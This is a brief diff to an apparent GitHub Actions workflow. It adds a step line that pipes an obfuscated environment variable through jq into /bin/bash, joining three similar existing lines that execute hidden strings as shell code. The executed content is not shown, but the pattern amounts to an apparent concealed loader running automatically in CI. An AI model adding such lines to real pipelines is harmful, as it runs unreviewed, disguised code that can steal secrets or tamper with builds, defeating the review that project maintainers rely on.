@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$eexx1929" | jq -r .yc77029 | /bin/bash
           printf '%s' "$sh9" | jq -r .kpvg2 | /bin/bash
           echo $pxd63 | jq -r .kirbi0 | /bin/bash
+          echo $dl739 | jq -r .sm6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
